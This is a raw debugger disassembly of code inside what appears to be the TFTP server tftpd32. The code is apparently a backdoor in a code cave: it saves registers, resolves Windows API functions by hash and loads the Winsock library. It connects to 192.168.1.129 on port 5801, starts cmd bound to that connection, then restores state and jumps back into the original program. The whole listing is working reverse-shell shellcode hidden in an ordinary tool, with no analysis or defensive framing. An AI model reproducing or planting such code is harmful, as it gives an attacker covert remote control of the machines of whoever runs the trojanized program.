001B4010   90               NOP
001B4011   90               NOP
001B4012   90               NOP
001B4013   90               NOP
001B4014   90               NOP
001B4015   90               NOP
001B4016   90               NOP
001B4017   90               NOP
001B4018   90               NOP
001B4019   60               PUSHAD
001B401A   9C               PUSHFD
001B401B   90               NOP
001B401C   90               NOP
001B401D   90               NOP
001B401E   90               NOP
001B401F   90               NOP
001B4020   90               NOP
001B4021   90               NOP
001B4022   90               NOP
001B4023   90               NOP
001B4024   90               NOP
001B4025   90               NOP
001B4026   90               NOP
001B4027   90               NOP
001B4028   90               NOP
001B4029   90               NOP
001B402A   90               NOP
001B402B   90               NOP
001B402C   90               NOP
001B402D   FC               CLD
001B402E   E8 82000000      CALL tftpd32-.001B40B5
001B4033   60               PUSHAD
001B4034   89E5             MOV EBP, ESP
001B4036   31C0             XOR EAX, EAX
001B4038   64:8B50 30       MOV EDX, DWORD PTR FS:[EAX+30]
001B403C   8B52 0C          MOV EDX, DWORD PTR DS:[EDX+C]
001B403F   8B52 14          MOV EDX, DWORD PTR DS:[EDX+14]
001B4042   8B72 28          MOV ESI, DWORD PTR DS:[EDX+28]
001B4045   0FB74A 26        MOVZX ECX, WORD PTR DS:[EDX+26]
001B4049   31FF             XOR EDI, EDI
001B404B   AC               LODS BYTE PTR DS:[ESI]
001B404C   3C 61            CMP AL, 61
001B404E   7C 02            JL SHORT tftpd32-.001B4052
001B4050   2C 20            SUB AL, 20
001B4052   C1CF 0D          ROR EDI, 0D
001B4055   01C7             ADD EDI, EAX
001B4057  ^E2 F2            LOOPD SHORT tftpd32-.001B404B
001B4059   52               PUSH EDX
001B405A   57               PUSH EDI
001B405B   8B52 10          MOV EDX, DWORD PTR DS:[EDX+10]
001B405E   8B4A 3C          MOV ECX, DWORD PTR DS:[EDX+3C]
001B4061   8B4C11 78        MOV ECX, DWORD PTR DS:[ECX+EDX+78]
001B4065   E3 48            JECXZ SHORT tftpd32-.001B40AF
001B4067   01D1             ADD ECX, EDX
001B4069   51               PUSH ECX
001B406A   8B59 20          MOV EBX, DWORD PTR DS:[ECX+20]
001B406D   01D3             ADD EBX, EDX
001B406F   8B49 18          MOV ECX, DWORD PTR DS:[ECX+18]
001B4072   E3 3A            JECXZ SHORT tftpd32-.001B40AE
001B4074   49               DEC ECX
001B4075   8B348B           MOV ESI, DWORD PTR DS:[EBX+ECX*4]
001B4078   01D6             ADD ESI, EDX
001B407A   31FF             XOR EDI, EDI
001B407C   AC               LODS BYTE PTR DS:[ESI]
001B407D   C1CF 0D          ROR EDI, 0D
001B4080   01C7             ADD EDI, EAX
001B4082   38E0             CMP AL, AH
001B4084  ^75 F6            JNZ SHORT tftpd32-.001B407C
001B4086   037D F8          ADD EDI, DWORD PTR SS:[EBP-8]
001B4089   3B7D 24          CMP EDI, DWORD PTR SS:[EBP+24]
001B408C  ^75 E4            JNZ SHORT tftpd32-.001B4072
001B408E   58               POP EAX
001B408F   8B58 24          MOV EBX, DWORD PTR DS:[EAX+24]
001B4092   01D3             ADD EBX, EDX
001B4094   66:8B0C4B        MOV CX, WORD PTR DS:[EBX+ECX*2]
001B4098   8B58 1C          MOV EBX, DWORD PTR DS:[EAX+1C]
001B409B   01D3             ADD EBX, EDX
001B409D   8B048B           MOV EAX, DWORD PTR DS:[EBX+ECX*4]
001B40A0   01D0             ADD EAX, EDX
001B40A2   894424 24        MOV DWORD PTR SS:[ESP+24], EAX
001B40A6   5B               POP EBX
001B40A7   5B               POP EBX
001B40A8   61               POPAD
001B40A9   59               POP ECX
001B40AA   5A               POP EDX
001B40AB   51               PUSH ECX
001B40AC   FFE0             JMP NEAR EAX
001B40AE   5F               POP EDI
001B40AF   5F               POP EDI
001B40B0   5A               POP EDX
001B40B1   8B12             MOV EDX, DWORD PTR DS:[EDX]
001B40B3  ^EB 8D            JMP SHORT tftpd32-.001B4042
001B40B5   5D               POP EBP
001B40B6   68 33320000      PUSH 3233
001B40BB   68 7773325F      PUSH 5F327377
001B40C0   54               PUSH ESP
001B40C1   68 4C772607      PUSH 726774C
001B40C6   FFD5             CALL NEAR EBP
001B40C8   B8 90010000      MOV EAX, 190
001B40CD   29C4             SUB ESP, EAX
001B40CF   54               PUSH ESP
001B40D0   50               PUSH EAX
001B40D1   68 29806B00      PUSH 6B8029
001B40D6   FFD5             CALL NEAR EBP
001B40D8   50               PUSH EAX
001B40D9   50               PUSH EAX
001B40DA   50               PUSH EAX
001B40DB   50               PUSH EAX
001B40DC   40               INC EAX
001B40DD   50               PUSH EAX
001B40DE   40               INC EAX
001B40DF   50               PUSH EAX
001B40E0   68 EA0FDFE0      PUSH E0DF0FEA
001B40E5   FFD5             CALL NEAR EBP
001B40E7   97               XCHG EAX, EDI
001B40E8   6A 05            PUSH 5
001B40EA   68 C0A80181      PUSH 8101A8C0
001B40EF   68 020016A9      PUSH A9160002
001B40F4   89E6             MOV ESI, ESP
001B40F6   6A 10            PUSH 10
001B40F8   56               PUSH ESI
001B40F9   57               PUSH EDI
001B40FA   68 99A57461      PUSH 6174A599
001B40FF   FFD5             CALL NEAR EBP
001B4101   85C0             TEST EAX, EAX
001B4103   74 0C            JE SHORT tftpd32-.001B4111
001B4105   FF4E 08          DEC DWORD PTR DS:[ESI+8]
001B4108  ^75 EC            JNZ SHORT tftpd32-.001B40F6
001B410A   83EC 5C          SUB ESP, 5C
001B410D   EB 63            JMP SHORT tftpd32-.001B4172
001B410F   90               NOP
001B4110   90               NOP
001B4111   68 636D6400      PUSH 646D63
001B4116   89E3             MOV EBX, ESP
001B4118   57               PUSH EDI
001B4119   57               PUSH EDI
001B411A   57               PUSH EDI
001B411B   31F6             XOR ESI, ESI
001B411D   6A 12            PUSH 12
001B411F   59               POP ECX
001B4120   56               PUSH ESI
001B4121  ^E2 FD            LOOPD SHORT tftpd32-.001B4120
001B4123   66:C74424 3C 010>MOV WORD PTR SS:[ESP+3C], 101
001B412A   8D4424 10        LEA EAX, DWORD PTR SS:[ESP+10]
001B412E   C600 44          MOV BYTE PTR DS:[EAX], 44
001B4131   54               PUSH ESP
001B4132   50               PUSH EAX
001B4133   56               PUSH ESI
001B4134   56               PUSH ESI
001B4135   56               PUSH ESI
001B4136   46               INC ESI
001B4137   56               PUSH ESI
001B4138   4E               DEC ESI
001B4139   56               PUSH ESI
001B413A   56               PUSH ESI
001B413B   53               PUSH EBX
001B413C   56               PUSH ESI
001B413D   68 79CC3F86      PUSH 863FCC79
001B4142   FFD5             CALL NEAR EBP
001B4144   89E0             MOV EAX, ESP
001B4146   90               NOP
001B4147   56               PUSH ESI
001B4148   46               INC ESI
001B4149   FF30             PUSH DWORD PTR DS:[EAX]
001B414B   68 08871D60      PUSH 601D8708
001B4150   FFD5             CALL NEAR EBP
001B4152   BB AAC5E25D      MOV EBX, 5DE2C5AA
001B4157   68 A695BD9D      PUSH 9DBD95A6
001B415C   FFD5             CALL NEAR EBP
001B415E   3C 06            CMP AL, 6
001B4160   7C 0A            JL SHORT tftpd32-.001B416C
001B4162   80FB E0          CMP BL, 0E0
001B4165   75 05            JNZ SHORT tftpd32-.001B416C
001B4167   BB 4713726F      MOV EBX, 6F721347
001B416C   6A 00            PUSH 0
001B416E   53               PUSH EBX
001B416F   FFD5             CALL NEAR EBP
001B4171   90               NOP
001B4172   90               NOP
001B4173   90               NOP
001B4174   81C4 00020000    ADD ESP, 200
001B417A   90               NOP
001B417B   90               NOP
001B417C   90               NOP
001B417D   90               NOP
001B417E   90               NOP
001B417F   90               NOP
001B4180   90               NOP
001B4181   90               NOP
001B4182   90               NOP
001B4183   90               NOP
001B4184   9D               POPFD
001B4185   61               POPAD
001B4186   90               NOP
001B4187   81E2 0000FFFF    AND EDX, FFFF0000
001B418D   81C2 F5280100    ADD EDX, 128F5
001B4193   52               PUSH EDX
001B4194   FFD2             CALL NEAR EDX
001B4196   5A               POP EDX
001B4197   81E2 0000FFFF    AND EDX, FFFF0000
001B419D   81EA B3770000    SUB EDX, 77B3
001B41A3   FFE2             JMP NEAR EDX
001B41A5   90               NOP
001B41A6   90               NOP
001B41A7   90               NOP

